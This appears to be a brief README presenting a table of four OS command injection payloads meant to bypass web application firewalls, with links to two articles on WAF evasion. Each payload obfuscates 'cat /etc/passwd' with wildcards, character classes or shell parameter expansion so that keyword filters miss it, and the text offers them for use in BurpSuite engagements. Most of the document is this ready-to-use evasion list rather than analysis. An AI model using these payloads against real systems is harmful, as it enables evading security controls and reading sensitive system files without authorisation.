# Bypass-WAF-OS-command-injection
In todays Web Penetration Testing you must have good injection payloads to fasten your engagements.<br>
You can use this on BurpSuite. Method below can be use on Web Penetration Testing.
<br>
<table border="1">
    <tr>
        <th>OS Command Injection Bypassing WAF </th>
    </tr>
    <tr>
        <td>1. cat /e*c/p*s*d</td>
    </tr>
    <tr>
        <td>2. cat /e[tv]c/p[aeiou]*d</td>
    </tr>
    <tr>
        <td>3. cat /e??/p????d</td>
    </tr>
    <tr>
        <td>4. cat /et${FOO:-c}/pa${BAR:-sswd}</td>
    </tr>
</table>

Another actual good reference:<br>
1. https://medium.com/@themiddleblue/waf-evasion-techniques-718026d693d8<br>
2. https://infosecwriteups.com/alibaba-cloud-waf-command-injection-bypass-via-wildcard-payload-in-all-1-462-built-in-rule-set-989b75db6e2f

